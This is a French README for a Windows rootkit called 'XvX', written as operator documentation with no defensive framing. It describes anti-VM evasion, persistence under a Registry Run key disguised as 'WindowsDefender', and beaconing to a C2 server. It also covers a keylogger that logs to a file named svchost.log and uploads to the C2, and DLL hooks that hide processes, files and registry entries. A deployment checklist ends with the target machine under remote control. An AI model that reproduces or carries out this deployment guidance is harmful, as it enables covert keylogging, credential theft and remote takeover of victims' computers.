# XvX Rootkit - Comportement Furtif

## 🔒 Mode Production (Rootkit Furtif)

Compilation: `.\build.ps1`

### Caractéristiques
- ✅ **Aucune console** - Exécution invisible
- ✅ **Aucun log** - Tous les wcout désactivés
- ✅ **Anti-VM/Debugger** - Détection et exit silencieux
- ✅ **Persistance automatique** - Registry Run key
- ✅ **Connexion C2 automatique** au démarrage
- ✅ **Beacon immédiat** - Agent online dans les 5 secondes
- ✅ **Keylogger actif** - Logging local + C2
- ✅ **Hooks DLL** - Process/File/Registry hiding
- ✅ **Mode daemon** - Tourne en arrière-plan

### Démarrage Automatique
Le rootkit s'installe dans:
```
HKEY_CURRENT_USER\Software\Microsoft\Windows\CurrentVersion\Run
Nom: "WindowsDefender"
```

Au redémarrage, il:
1. Lance sans fenêtre (WinMain + -mwindows)
2. Détecte VM/Debugger et exit si trouvé
3. Se connecte au C2 (lecture de c2_config.txt)
4. Envoie un beacon immédiat
5. Active le keylogger
6. Injecte les hooks DLL
7. Entre en boucle de message (daemon)

### Agent Online au C2
- Beacon envoyé **immédiatement** au lancement
- Puis toutes les **60 secondes**
- Dashboard affiche [ONLINE] si `last_seen < 2.5 minutes`

## 🐛 Mode Debug (Développement)

Compilation: `.\build_debug.ps1`

### Caractéristiques
- ⚠️ **Console visible** - Pour voir les logs
- ⚠️ **Logs actifs** - Tous les wcout activés
- ⚠️ **Pas d'anti-VM** - Pour tester en VM
- ✅ Toutes les autres fonctionnalités identiques

### Quand utiliser
- Tests en local
- Debugging
- Développement de nouvelles features
- Vérification du comportement

## 📋 Checklist de Déploiement

### Avant déploiement:
1. ✅ Compiler en mode RELEASE: `.\build.ps1`
2. ✅ Vérifier que rootkit.exe = **1202 KB** (sans debug)
3. ✅ Créer `c2_config.txt` avec l'URL du C2:
   ```
   https://votre-c2.com:8443
   ```
4. ✅ Démarrer le serveur C2: `python c2_server.py`
5. ✅ Tester la connexion avant déploiement

### Sur la machine cible:
1. Copier le dossier `deploy_package\`
2. Lancer `rootkit.exe` une fois
3. → Persistance installée automatiquement
4. → Agent apparaît [ONLINE] sur le dashboard
5. → Keylogger actif
6. → Machine contrôlée à distance

## 🔧 Configuration C2

Fichier `c2_config.txt` (même dossier que rootkit.exe):
```
https://192.168.1.100:8443
https://backup-c2.com:443
https://fallback.example.org:8443
```

Le rootkit essaie chaque URL jusqu'à trouver un C2 actif.

## 📊 Vérification

### Dashboard C2 doit afficher:
- Agent ID
- IP
- Hostname  
- User
- OS Version
- Last Seen (< 2 minutes)
- Status: **[ONLINE]** ✅

### Keylogger
Logs sauvegardés dans:
- Local: `%TEMP%\svchost.log`
- C2: Via `/api/result`

### Persistance
Vérifier la clé:
```powershell
Get-ItemProperty "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name "WindowsDefender"
```
